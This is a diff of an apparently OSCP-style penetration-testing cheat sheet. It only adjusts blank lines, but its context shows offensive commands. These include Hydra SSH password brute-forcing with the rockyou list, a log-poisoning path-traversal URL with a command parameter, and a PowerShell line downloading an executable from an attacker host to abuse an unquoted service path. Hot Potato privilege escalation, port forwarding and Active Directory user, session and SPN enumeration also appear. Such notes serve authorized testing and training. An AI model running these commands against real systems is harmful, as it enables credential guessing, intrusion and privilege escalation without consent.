@@ -639,6 +639,7 @@
 ## Low Privilege Exploitation
 
 ### Hydra
+
 	```
 	hydra -V -f -l USER -P /usr/share/wordlists/rockyou.txt ssh://IP:22/
 	hydra -V -f -L USERLIST -P /usr/share/wordlists/rockyou.txt ssh://IP:22/
@@ -647,12 +648,14 @@
 	```
 
 ### Searchsploit
+
 	```
 	searchsploit EXPLOIT
 	searchsploit -m NUMBER_EXPLOIT
 	```
 
 ### Log poisoning
+
 	```
 	http://IP:PORT/index.php?book=../../../../var/log/apache2/access.log&cmd=whoami
 	```
@@ -983,7 +986,6 @@ Do not forget if availabe: ``` powershell -ep bypass ```
 	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
 	sc start unquotedsvc
 	```
-
 12. Hot potato
 	```
 	\# Exploitation
@@ -1038,6 +1040,7 @@ Do not forget if availabe: ``` powershell -ep bypass ```
 ## Post Exploitation
 
 ### New Host Discover
+
 	```
 	netdiscover
 	ip a
@@ -1047,10 +1050,12 @@ Do not forget if availabe: ``` powershell -ep bypass ```
 
 ### Port Forwarding
 Do not forget to to check /root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
+
 	```
 	cat /root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
 	/root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
 	```
+	
 1. **RINETD**
 Internet traffic on port 80 redirection from Kali to Victim
 	```
@@ -1141,7 +1146,6 @@ Internet traffic on port 80 redirection from Kali to Victim
 	net user user /domain
 	net group /domain
 	```
-	
 2. Lightweight Directory Access Protocol (LDAP)
 	```
 	LDAP://HostName[:PortNumber][/DistinbuisedName]
@@ -1250,7 +1254,6 @@ Internet traffic on port 80 redirection from Kali to Victim
 	Get-NetLoggedon -ComputerName client251
 	Get-NetSession -ComputerName dc01
 	```
-
 5. Enumeration Through Service Principal Names
 	```
 	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -1274,7 +1277,6 @@ Internet traffic on port 80 redirection from Kali to Victim
 	
 	nslookup CorpWebServer.corp.com \# service principalname
 	```
-
 **Active Directory Authentication**
 
 1. NTLM Authentication
